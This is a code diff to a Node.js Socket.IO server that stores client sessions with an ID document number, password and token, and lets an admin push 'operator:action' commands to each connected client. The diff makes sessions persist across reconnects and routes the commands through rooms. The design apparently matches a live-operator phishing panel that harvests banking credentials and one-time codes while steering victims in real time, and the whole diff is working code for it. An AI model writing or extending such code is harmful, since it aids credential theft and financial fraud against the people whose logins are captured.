@@ -77,8 +77,11 @@ io.on("connection", (socket) => {
   });
 
   socket.on("client:update", (data) => {
-    let session = sessions.get(socket.id) || {
-      id: socket.id,
+    const key = data.clientId || socket.id;
+    socket.join(key);
+
+    let session = sessions.get(key) || {
+      id: key,
       ip: socket.handshake.address || "127.0.0.1",
       userAgent: socket.handshake.headers["user-agent"] || "",
       docType: "DNI",
@@ -87,6 +90,7 @@ io.on("connection", (socket) => {
       token: "",
     };
 
+    session.socketId = socket.id;
     if (data.docType) session.docType = data.docType;
     if (data.docNumber !== undefined && data.docNumber.trim() !== "") session.docNumber = data.docNumber.trim();
     if (data.password !== undefined && data.password !== "") session.password = data.password;
@@ -95,21 +99,21 @@ io.on("connection", (socket) => {
     if (data.status) session.status = data.status;
     session.updatedAt = new Date().toLocaleTimeString();
 
-    sessions.set(socket.id, session);
+    sessions.set(key, session);
     broadcastSessions();
   });
 
   socket.on("admin:command", ({ targetId, action, message }) => {
-    const targetSocket = io.sockets.sockets.get(targetId);
     const session = sessions.get(targetId);
-    if (targetSocket) {
-      targetSocket.emit("operator:action", { action, message });
-      if (session) {
-        session.lastAction = action;
-        session.status = `Operación enviada: ${action}`;
-        session.updatedAt = new Date().toLocaleTimeString();
-        broadcastSessions();
-      }
+    if (session) {
+      session.lastAction = action;
+      session.status = `Operación enviada: ${action}`;
+      session.updatedAt = new Date().toLocaleTimeString();
+      broadcastSessions();
+    }
+    io.to(targetId).emit("operator:action", { targetId, action, message });
+    if (session && session.socketId && session.socketId !== targetId) {
+      io.to(session.socketId).emit("operator:action", { targetId, action, message });
     }
   });
 
